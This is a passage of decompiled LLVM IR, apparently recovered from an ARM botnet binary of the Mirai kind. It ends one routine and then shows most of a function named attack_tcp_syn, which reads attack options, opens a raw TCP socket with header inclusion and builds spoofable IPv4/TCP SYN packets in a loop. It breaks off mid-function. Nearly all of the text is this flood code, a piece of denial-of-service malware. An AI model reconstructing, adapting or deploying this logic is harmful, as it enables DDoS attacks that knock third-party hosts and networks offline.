  %v3_af20 = call i32 @rand_str(i16* %v2_af20, i32 %v6_aa14)
  store i32 %v3_af20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ada0

dec_label_pc_af28:                                ; preds = %dec_label_pc_aa74
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v1_af2c = call i32 @__GI___libc_close(i32 %v3_aa64)
  store i32 %v1_af2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af30

dec_label_pc_af30:                                ; preds = %entry, %dec_label_pc_af28
  %v1_af38 = phi i32 [ %v3_aa64, %entry ], [ %v1_af2c, %dec_label_pc_af28 ]
  store i32 %v18_a864, i32* %sb.global-to-local, align 4
  store i32 %v24_a864, i32* %fp.global-to-local, align 4
  store i32 %v27_a864, i32* %lr.global-to-local, align 4
  ret i32 %v1_af38

dec_label_pc_af3c:                                ; preds = %dec_label_pc_aa9c
  store i32 %v6_aa14, i32* %r0.global-to-local, align 4
  %v1_af44 = add i32 %v6_aa14, 20
  store i32 %v1_af44, i32* @sb, align 4
  %v3_af48 = mul i32 %v6_aa14, 65536
  store i32 %v3_af48, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_acf8

; uselistorder directives
  uselistorder i32 %v0_aedc, { 1, 0 }
  uselistorder i32 %v0_aec8, { 1, 0 }
  uselistorder i32 %v0_aeb4, { 1, 0 }
  uselistorder i32 %v5_ae88, { 1, 0 }
  uselistorder i32 %v3_ae38, { 3, 1, 2, 0 }
  uselistorder i32 %v1_ae14, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ade0, { 1, 0 }
  uselistorder i32 %v4_add0, { 1, 0 }
  uselistorder i1 %v7_ad48, { 2, 1, 0 }
  uselistorder i1 %v2_af0c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_aea8, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_acdc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_acb0, { 1, 0 }
  uselistorder i32 %v1_ab64, { 1, 2, 0 }
  uselistorder i32 %v1_ab60, { 2, 1, 0 }
  uselistorder i32 %v1_ab5c, { 2, 0, 1 }
  uselistorder i32 %v1_ab58, { 2, 0, 1 }
  uselistorder i32 %v1_ab54, { 2, 0, 1 }
  uselistorder i32 %v1_ab2c, { 1, 0 }
  uselistorder i32 %v3_aad4, { 1, 0 }
  uselistorder i32 %v3_aaac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_aaa4, { 1, 0, 2 }
  uselistorder i32 %v0_aaa0, { 1, 0, 2 }
  uselistorder i32 %v0_aa9c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_aa94, { 1, 0 }
  uselistorder i1 %v7_aa68, { 1, 0 }
  uselistorder i32 %v3_aa64, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_aa50, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_aa3c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_aa14, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_a96c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_a950, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_a900, { 1, 2, 0 }
  uselistorder i32 %v5_a8f4, { 0, 2, 1 }
  uselistorder i32 %v5_a8bc, { 0, 2, 1 }
  uselistorder i32 %v2_a880, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 24, 23, 25, 26, 27, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_af30, { 1, 0 }
  uselistorder label %dec_label_pc_af18, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ad1c, { 1, 0 }
  uselistorder label %dec_label_pc_ad0c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_af5c = load i32, i32* @r4, align 4
  %v24_af5c = load i32, i32* @fp, align 4
  %v27_af5c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_af78 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_af7c = load i32, i32* @r5, align 4
  store i32 %v0_af7c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_af78, i32* @sb, align 4
  %v0_af8c = load i32, i32* @r4, align 4
  store i32 %v0_af8c, i32* %r0.global-to-local, align 4
  %v5_af90 = inttoptr i32 %v0_af7c to i32*
  %v6_af90 = call i32 @attack_get_opt_int(i32 %v0_af8c, i32* %v5_af90, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_afa8 = load i32, i32* @r5, align 4
  store i32 %v0_afa8, i32* %r1.global-to-local, align 4
  %v0_afac = load i32, i32* @r4, align 4
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  %v5_afb0 = trunc i32 %v6_af90 to i8
  %v6_afb4 = inttoptr i32 %v0_afa8 to i32*
  %v7_afb4 = call i32 @attack_get_opt_int(i32 %v0_afac, i32* %v6_afb4, i32 3, i32 65535, i32 %v6_af90)
  %v0_afb8 = load i32, i32* @r5, align 4
  store i32 %v0_afb8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r0.global-to-local, align 4
  %v5_afcc = inttoptr i32 %v0_afb8 to i32*
  %v6_afcc = call i32 @attack_get_opt_int(i32 %v0_afc8, i32* %v5_afcc, i32 4, i32 64, i32 %v7_afb4)
  %v1_afd4 = urem i32 %v6_afcc, 256
  %v0_afd8 = load i32, i32* @r5, align 4
  store i32 %v0_afd8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  store i32 %v0_afe4, i32* %r0.global-to-local, align 4
  %v6_afec = inttoptr i32 %v0_afd8 to i32*
  %v7_afec = call i32 @attack_get_opt_int(i32 %v0_afe4, i32* %v6_afec, i32 5, i32 1, i32 %v1_afd4)
  %v1_aff8 = urem i32 %v7_afec, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b004 = load i32, i32* @r5, align 4
  store i32 %v0_b004, i32* %r1.global-to-local, align 4
  %v0_b008 = load i32, i32* @r4, align 4
  store i32 %v0_b008, i32* %r0.global-to-local, align 4
  %v5_b010 = inttoptr i32 %v0_b004 to i32*
  %v6_b010 = call i32 @attack_get_opt_int(i32 %v0_b008, i32* %v5_b010, i32 6, i32 65535, i32 %v1_aff8)
  %v0_b018 = load i32, i32* @r5, align 4
  store i32 %v0_b018, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b010, i32* %fp.global-to-local, align 4
  %v0_b028 = load i32, i32* @r4, align 4
  store i32 %v0_b028, i32* %r0.global-to-local, align 4
  %v5_b02c = inttoptr i32 %v0_b018 to i32*
  %v6_b02c = call i32 @attack_get_opt_int(i32 %v0_b028, i32* %v5_b02c, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b034 = load i32, i32* @r5, align 4
  store i32 %v0_b034, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_b02c, i32* @r6, align 4
  %v0_b044 = load i32, i32* @r4, align 4
  store i32 %v0_b044, i32* %r0.global-to-local, align 4
  %v5_b048 = inttoptr i32 %v0_b034 to i32*
  %v6_b048 = call i32 @attack_get_opt_int(i32 %v0_b044, i32* %v5_b048, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b04c = load i32, i32* @r5, align 4
  store i32 %v0_b04c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b05c = load i32, i32* @r4, align 4
  store i32 %v0_b05c, i32* %r0.global-to-local, align 4
  %v5_b060 = inttoptr i32 %v0_b04c to i32*
  %v6_b060 = call i32 @attack_get_opt_int(i32 %v0_b05c, i32* %v5_b060, i32 18, i32 0, i32 %v6_b048)
  %v0_b064 = load i32, i32* @r5, align 4
  store i32 %v0_b064, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b074 = load i32, i32* @r4, align 4
  store i32 %v0_b074, i32* %r0.global-to-local, align 4
  %v5_b078 = inttoptr i32 %v0_b064 to i32*
  %v6_b078 = call i32 @attack_get_opt_int(i32 %v0_b074, i32* %v5_b078, i32 11, i32 0, i32 %v6_b060)
  %v0_b07c = load i32, i32* @r5, align 4
  store i32 %v0_b07c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b08c = load i32, i32* @r4, align 4
  store i32 %v0_b08c, i32* %r0.global-to-local, align 4
  %v5_b090 = inttoptr i32 %v0_b07c to i32*
  %v6_b090 = call i32 @attack_get_opt_int(i32 %v0_b08c, i32* %v5_b090, i32 12, i32 0, i32 %v6_b078)
  %v0_b094 = load i32, i32* @r5, align 4
  store i32 %v0_b094, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0a4 = load i32, i32* @r4, align 4
  store i32 %v0_b0a4, i32* %r0.global-to-local, align 4
  %v5_b0a8 = inttoptr i32 %v0_b094 to i32*
  %v6_b0a8 = call i32 @attack_get_opt_int(i32 %v0_b0a4, i32* %v5_b0a8, i32 13, i32 0, i32 %v6_b090)
  %v0_b0ac = load i32, i32* @r5, align 4
  store i32 %v0_b0ac, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0bc = load i32, i32* @r4, align 4
  store i32 %v0_b0bc, i32* %r0.global-to-local, align 4
  %v5_b0c0 = inttoptr i32 %v0_b0ac to i32*
  %v6_b0c0 = call i32 @attack_get_opt_int(i32 %v0_b0bc, i32* %v5_b0c0, i32 14, i32 0, i32 %v6_b0a8)
  %v0_b0c4 = load i32, i32* @r5, align 4
  store i32 %v0_b0c4, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b0d4 = load i32, i32* @r4, align 4
  store i32 %v0_b0d4, i32* %r0.global-to-local, align 4
  %v5_b0d8 = inttoptr i32 %v0_b0c4 to i32*
  %v6_b0d8 = call i32 @attack_get_opt_int(i32 %v0_b0d4, i32* %v5_b0d8, i32 15, i32 1, i32 %v6_b0c0)
  %v0_b0dc = load i32, i32* @r5, align 4
  store i32 %v0_b0dc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0ec = load i32, i32* @r4, align 4
  store i32 %v0_b0ec, i32* %r0.global-to-local, align 4
  %v5_b0f0 = inttoptr i32 %v0_b0dc to i32*
  %v6_b0f0 = call i32 @attack_get_opt_int(i32 %v0_b0ec, i32* %v5_b0f0, i32 16, i32 0, i32 %v6_b0d8)
  %v2_b0fc = load i32, i32* @global_var_24f40.59, align 4
  store i32 %v2_b0fc, i32* %r3.global-to-local, align 4
  %v0_b100 = load i32, i32* @r5, align 4
  store i32 %v0_b100, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b108 = load i32, i32* @r4, align 4
  store i32 %v0_b108, i32* %r0.global-to-local, align 4
  %v5_b10c = inttoptr i32 %v0_b100 to i32*
  %v6_b10c = call i32 @attack_get_opt_ip(i32 %v0_b108, i32* %v5_b10c, i32 25, i32 %v2_b0fc, i32 %v6_b0f0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b120 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b120, i32* %r0.global-to-local, align 4
  %v7_b124 = icmp eq i32 %v3_b120, -1
  store i1 %v7_b124, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b120, i32* @sl, align 4
  br i1 %v7_b124, label %dec_label_pc_b5f8, label %dec_label_pc_b130

dec_label_pc_b130:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b138 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b138, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b14c = call i32 @__GI_setsockopt(i32 %v3_b120, i32 0, i32 3, i32 %v6_b138, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b14c, i32* %r0.global-to-local, align 4
  %v7_b150 = icmp eq i32 %v5_b14c, -1
  store i1 %v7_b150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b150, label %dec_label_pc_b5f0, label %dec_label_pc_b158

dec_label_pc_b158:                                ; preds = %dec_label_pc_b130
  %v3_b160 = mul i32 %v7_afb4, 65536
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v0_b164 = load i32, i32* %fp.global-to-local, align 4
  %v3_b164 = mul i32 %v0_b164, 65536
  store i32 %v3_b164, i32* %r4.global-to-local, align 4
  %v0_b168 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_b078, i32* %r2.global-to-local, align 4
  %v3_b174 = urem i32 %v7_afb4, 65536
  store i32 %v3_b174, i32* %r3.global-to-local, align 4
  %v3_b178 = urem i32 %v0_b164, 65536
  %v3_b17c = urem i32 %v0_b168, 65536
  store i32 %v3_b17c, i32* %r1.global-to-local, align 4
  %v0_b180 = load i32, i32* @r7, align 4
  %v2_b180 = icmp eq i32 %v0_b180, 0
  store i1 %v2_b180, i1* %cpsr_z.global-to-local, align 1
  %v1_b190 = urem i32 %v6_b078, 256
  store i32 %v1_b190, i32* @fp, align 4
  br i1 %v2_b180, label %dec_label_pc_b3e4.preheader, label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_b158
  %tmp52 = mul i32 %v6_b048, 256
  %v3_b1b0 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_afb4, 256
  %v3_b1b4 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v6_b048, 256
  %v4_b1bc = urem i32 %tmp54, 256
  %v5_b1bc = or i32 %v4_b1bc, %v3_b1b0
  store i32 %v5_b1bc, i32* @lr, align 4
  %v1_b1b8 = mul i32 %v7_afb4, 256
  %v4_b1c0 = and i32 %v1_b1b8, 65280
  %v5_b1c0 = or i32 %v4_b1c0, %v3_b1b4
  %tmp55 = mul i32 %v0_b164, 256
  %v3_b1cc = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_b168, 256
  %v3_b1d0 = and i32 %tmp56, 65280
  %v1_b1d4 = urem i32 %v6_b078, 2
  %v1_b1d8 = urem i32 %v6_b090, 2
  %tmp57 = udiv i32 %v0_b164, 256
  %v4_b1dc = urem i32 %tmp57, 256
  %v5_b1dc = or i32 %v4_b1dc, %v3_b1cc
  store i32 %v5_b1dc, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_b168, 256
  %v4_b1e0 = urem i32 %tmp58, 256
  %v5_b1e0 = or i32 %v4_b1e0, %v3_b1d0
  store i32 %v5_b1e0, i32* @r5, align 4
  %v1_b1fc = urem i32 %v6_b0a8, 2
  store i32 %v1_b1fc, i32* %r2.global-to-local, align 4
  %v1_b200 = urem i32 %v6_b0c0, 2
  store i32 %v1_b200, i32* %r3.global-to-local, align 4
  %v1_b204 = urem i32 %v6_b0d8, 2
  store i32 %v1_b204, i32* %r0.global-to-local, align 4
  %v1_b208 = urem i32 %v6_b0f0, 2
  store i32 %v1_b208, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_b1c0, 65536
  %v4_b290 = sdiv i32 %sext, 65536
  %tmp = sub nsw i32 0, %v1_b1d8
  %v4_b2f4 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_b1fc
  %v4_b308 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_b200
  %v4_b320 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_b204
  %v3_b334 = and i32 %tmp64, 2
  %v1_b284 = trunc i32 %v6_afcc to i8
  br label %dec_label_pc_b228

dec_label_pc_b228:                                ; preds = %bb61, %dec_label_pc_b198
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_b230 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_b230, i32* %r0.global-to-local, align 4
  %v3_b234 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b234, i32* %r2.global-to-local, align 4
  %v1_b238 = load i32, i32* @sb, align 4
  %v2_b238 = load i32, i32* @r4, align 4
  %v5_b238 = mul i32 %v2_b238, 4
  %v6_b238 = add i32 %v5_b238, %v1_b238
  %v7_b238 = inttoptr i32 %v6_b238 to i32*
  store i32 %v2_b230, i32* %v7_b238, align 4
  %v0_b23c = load i32, i32* %r2.global-to-local, align 4
  %v3_b23c = mul i32 %v0_b23c, 32
  store i32 %v3_b23c, i32* %r3.global-to-local, align 4
  %v0_b240 = load i32, i32* @sb, align 4
  %v4_b240 = mul i32 %v0_b23c, 4
  %v5_b240 = add i32 %v0_b240, %v4_b240
  %v6_b240 = inttoptr i32 %v5_b240 to i32*
  %v7_b240 = load i32, i32* %v6_b240, align 4
  store i32 %v7_b240, i32* %r4.global-to-local, align 4
  %v5_b244 = mul i32 %v0_b23c, 24
  store i32 %v5_b244, i32* %r3.global-to-local, align 4
  %v1_b248 = load i32, i32* @r8, align 4
  %v2_b248 = add i32 %v1_b248, %v5_b244
  store i32 %v2_b248, i32* %r0.global-to-local, align 4
  %v1_b24c = inttoptr i32 %v7_b240 to i8*
  %v2_b24c = load i8, i8* %v1_b24c, align 1
  %tmp65 = urem i8 %v2_b24c, 16
  %v1_b250 = zext i8 %tmp65 to i32
  %v1_b254 = or i32 %v1_b250, 64
  store i32 %v1_b254, i32* %r3.global-to-local, align 4
  %v1_b258 = trunc i32 %v1_b254 to i8
  store i8 %v1_b258, i8* %v1_b24c, align 1
  %v0_b25c = load i32, i32* %r4.global-to-local, align 4
  %v1_b25c = inttoptr i32 %v0_b25c to i8*
  %v2_b25c = load i8, i8* %v1_b25c, align 1
  %v1_b260 = and i8 %v2_b25c, -16
  %v1_b264 = or i8 %v1_b260, 5
  store i32 %v1_aff8, i32* %r3.global-to-local, align 4
  store i8 %v1_b264, i8* %v1_b25c, align 1
  %v2_b274 = load i32, i32* %r4.global-to-local, align 4
  %v3_b274 = add i32 %v2_b274, 1
  %v4_b274 = inttoptr i32 %v3_b274 to i8*
  store i8 %v5_afb0, i8* %v4_b274, align 1
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  %v0_b27c = load i32, i32* %r3.global-to-local, align 4
  %v2_b27c = icmp eq i32 %v0_b27c, 0
  store i1 %v2_b27c, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_b284 = load i32, i32* %r4.global-to-local, align 4
  %v3_b284 = add i32 %v2_b284, 8
  %v4_b284 = inttoptr i32 %v3_b284 to i8*
  store i8 %v1_b284, i8* %v4_b284, align 1
  %v0_b288 = load i32, i32* %r3.global-to-local, align 4
  %v1_b288 = trunc i32 %v0_b288 to i16
  %v2_b288 = load i32, i32* %r4.global-to-local, align 4
  %v3_b288 = add i32 %v2_b288, 2
  %v4_b288 = inttoptr i32 %v3_b288 to i16*
  store i16 %v1_b288, i16* %v4_b288, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_b290, i32* %r1.global-to-local, align 4
  %v0_b294 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b294, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_b228
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_b228, %bb
  %v2_b298 = load i32, i32* %r4.global-to-local, align 4
  %v3_b298 = add i32 %v2_b298, 9
  %v4_b298 = inttoptr i32 %v3_b298 to i8*
  store i8 6, i8* %v4_b298, align 1
  %v0_b29c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b29c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_b29c = load i32, i32* %r2.global-to-local, align 4
  %v2_b29c = trunc i32 %v1_b29c to i16
  %v3_b29c = load i32, i32* %r4.global-to-local, align 4
  %v4_b29c = add i32 %v3_b29c, 6
  %v5_b29c = inttoptr i32 %v4_b29c to i16*
  store i16 %v2_b29c, i16* %v5_b29c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_b10c, i32* %r2.global-to-local, align 4
  %v1_b2a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2a4 = add i32 %v1_b2a4, 12
  %v3_b2a4 = inttoptr i32 %v2_b2a4 to i32*
  store i32 %v6_b10c, i32* %v3_b2a4, align 4
  %v0_b2a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_b2a8 = add i32 %v0_b2a8, 16
  %v2_b2a8 = inttoptr i32 %v1_b2a8 to i32*
  %v3_b2a8 = load i32, i32* %v2_b2a8, align 4
  store i32 %v3_b2a8, i32* %r3.global-to-local, align 4
  %v0_b2ac = load i32, i32* %r1.global-to-local, align 4
  %v1_b2ac = trunc i32 %v0_b2ac to i16
  %v2_b2ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b2ac = add i32 %v2_b2ac, 4
  %v4_b2ac = inttoptr i32 %v3_b2ac to i16*
  store i16 %v1_b2ac, i16* %v4_b2ac, align 2
  %v0_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2b0 = add i32 %v1_b2b0, 16
  %v3_b2b0 = inttoptr i32 %v2_b2b0 to i32*
  store i32 %v0_b2b0, i32* %v3_b2b0, align 4
  %v0_b2b4 = load i32, i32* @r6, align 4
  %v1_b2b4 = trunc i32 %v0_b2b4 to i16
  %v2_b2b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b2b4 = add i32 %v2_b2b4, 20
  %v4_b2b4 = inttoptr i32 %v3_b2b4 to i16*
  store i16 %v1_b2b4, i16* %v4_b2b4, align 2
  %v0_b2b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_b2b8 = add i32 %v0_b2b8, 20
  store i32 %v1_b2b8, i32* %r1.global-to-local, align 4
  %v1_b2bc = add i32 %v0_b2b8, 32
  %v2_b2bc = inttoptr i32 %v1_b2bc to i8*
  %v3_b2bc = load i8, i8* %v2_b2bc, align 1
  %v4_b2bc = zext i8 %v3_b2bc to i32
  store i32 %v4_b2bc, i32* %r3.global-to-local, align 4
  %v1_b2c0 = add i32 %v0_b2b8, 33
  %v2_b2c0 = inttoptr i32 %v1_b2c0 to i8*
  %v3_b2c0 = load i8, i8* %v2_b2c0, align 1
  %v4_b2c0 = zext i8 %v3_b2c0 to i32
  store i32 %v1_b1d4, i32* %r0.global-to-local, align 4
  %v1_b2c8 = urem i8 %v3_b2bc, 16
  %v1_b2cc = or i8 %v1_b2c8, -96
  %v1_b2d0 = and i32 %v4_b2c0, 223
  store i32 %v1_b2d0, i32* %r2.global-to-local, align 4
  store i8 %v1_b2cc, i8* %v2_b2bc, align 1
  %v0_b2d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2d8 = load i32, i32* %r0.global-to-local, align 4
  %v4_b2d8 = mul i32 %v1_b2d8, 32
  %v5_b2d8 = or i32 %v4_b2d8, %v0_b2d8
  store i32 %v5_b2d8, i32* %r2.global-to-local, align 4
  store i32 %v5_b1bc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = trunc i32 %v5_b2d8 to i8
  %v2_b2e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b2e0 = add i32 %v2_b2e0, 13
  %v4_b2e0 = inttoptr i32 %v3_b2e0 to i8*
  store i8 %v1_b2e0, i8* %v4_b2e0, align 1
  %v0_b2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b2e4 = add i32 %v1_b2e4, 4
  %v3_b2e4 = inttoptr i32 %v2_b2e4 to i32*
  store i32 %v0_b2e4, i32* %v3_b2e4, align 4
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 13
  %v2_b2e8 = inttoptr i32 %v1_b2e8 to i8*
  %v3_b2e8 = load i8, i8* %v2_b2e8, align 1
  %v4_b2e8 = zext i8 %v3_b2e8 to i32
  store i32 %v1_b1d8, i32* %r0.global-to-local, align 4
  %v1_b2f0 = and i32 %v4_b2e8, 239
  %v5_b2f4 = or i32 %v1_b2f0, %v4_b2f4
  store i32 %v5_b2f4, i32* %r3.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v5_b2f4 to i8
  store i8 %v1_b2f8, i8* %v2_b2e8, align 1
  %v0_b2fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2fc = add i32 %v0_b2fc, 13
  %v2_b2fc = inttoptr i32 %v1_b2fc to i8*
  %v3_b2fc = load i8, i8* %v2_b2fc, align 1
  %v4_b2fc = zext i8 %v3_b2fc to i32
  store i32 %v1_b1fc, i32* %r3.global-to-local, align 4
  %v1_b304 = and i32 %v4_b2fc, 247
  %v5_b308 = or i32 %v1_b304, %v4_b308
  store i32 %v5_b308, i32* %r2.global-to-local, align 4
  %v0_b30c = load i32, i32* @r5, align 4
  %v1_b30c = trunc i32 %v0_b30c to i16
  %v3_b30c = add i32 %v0_b2fc, 2
  %v4_b30c = inttoptr i32 %v3_b30c to i16*
  store i16 %v1_b30c, i16* %v4_b30c, align 2
  %v0_b310 = load i32, i32* %r2.global-to-local, align 4
  %v1_b310 = trunc i32 %v0_b310 to i8
  %v2_b310 = load i32, i32* %r1.global-to-local, align 4
  %v3_b310 = add i32 %v2_b310, 13
  %v4_b310 = inttoptr i32 %v3_b310 to i8*
  store i8 %v1_b310, i8* %v4_b310, align 1
  %v0_b314 = load i32, i32* %r1.global-to-local, align 4
  %v1_b314 = add i32 %v0_b314, 13
  %v2_b314 = inttoptr i32 %v1_b314 to i8*
  %v3_b314 = load i8, i8* %v2_b314, align 1
  %v4_b314 = zext i8 %v3_b314 to i32
  store i32 %v1_b200, i32* %r0.global-to-local, align 4
  %v1_b31c = and i32 %v4_b314, 251
  %v5_b320 = or i32 %v1_b31c, %v4_b320
  store i32 %v5_b320, i32* %r3.global-to-local, align 4
  %v1_b324 = trunc i32 %v5_b320 to i8
  store i8 %v1_b324, i8* %v2_b314, align 1
  %v0_b328 = load i32, i32* %r1.global-to-local, align 4
  %v1_b328 = add i32 %v0_b328, 13
